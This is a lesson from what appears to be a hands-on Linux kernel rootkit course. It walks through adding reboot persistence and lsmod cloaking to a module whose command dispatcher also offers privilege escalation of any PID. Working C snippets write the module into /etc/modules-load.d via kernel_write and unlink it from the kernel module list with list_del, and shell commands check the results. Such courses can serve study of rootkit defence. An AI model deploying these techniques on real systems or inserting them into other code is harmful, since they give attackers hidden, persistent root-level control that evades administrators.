# Persist across reboot and hide from lsmod

This milestone adds two capabilities to your dispatcher: reboot survival
and module cloaking. Each one is about 10 lines of kernel code, wired
through the command dispatcher you built in L09.

After this milestone, you have 8 commands:

| Command | Action |
|---------|--------|
| e       | Escalate current process |
| e.PID   | Escalate target PID |
| ping    | Log acknowledgment |
| status  | Log state |
| persist | Survive reboot |
| unpersist | Remove reboot persistence |
| h.m     | Hide module from lsmod |
| u.m     | Unhide module |

## Persistence with filp_open and kernel_write

Linux loads modules listed in `/etc/modules-load.d/*.conf` at boot. To
persist, write the module name into that directory from kernel space:

```c
struct file *f;
loff_t pos = 0;

f = filp_open("/etc/modules-load.d/rklings.conf",
              O_WRONLY | O_CREAT | O_TRUNC, 0644);
if (IS_ERR(f))
    return PTR_ERR(f);
kernel_write(f, "rklings\n", 8, &pos);
filp_close(f, NULL);
```

`filp_open` opens a file using a kernel file handle. `kernel_write` writes
data from kernel memory (no userspace copy needed). The `pos` parameter
tracks the file offset.

To unpersist, open the same path and write an empty file (or truncate it).

## Module cloaking with list_del

The kernel tracks loaded modules in a doubly linked list. `lsmod` walks
this list. Removing your module from it makes you invisible:

```c
static struct list_head *saved_prev;

// Hide: remove from the module list
saved_prev = THIS_MODULE->list.prev;
list_del(&THIS_MODULE->list);

// Unhide: re-insert after the saved predecessor
list_add(&THIS_MODULE->list, saved_prev);
```

Save `list.prev` before deleting so you can restore the module later.
Without it, you cannot re-insert at the right position.

The module still runs normally while hidden. Only its listing is removed.
`rmmod` will not find it either, so always unhide before unloading.

## Your task

1. Write `rk_persist()` using filp_open + kernel_write
2. Write `rk_unpersist()` to remove the conf file
3. Write `rk_module_hide()` using list_del
4. Write `rk_module_unhide()` using list_add
5. Add "persist", "unpersist", "h.m", "u.m" to the dispatcher
6. Call `rk_module_unhide()` in the exit function (safety net)

## Verify

```sh
$ mkdir rklings.persist
$ cat /etc/modules-load.d/rklings.conf
rklings
$ mkdir rklings.h.m
$ lsmod | grep rklings
(no output)
$ mkdir rklings.u.m
$ lsmod | grep rklings
rklings  ...
$ mkdir rklings.unpersist
$ cat /etc/modules-load.d/rklings.conf
(empty or missing)
```

Run:

```sh
./rklings check
```
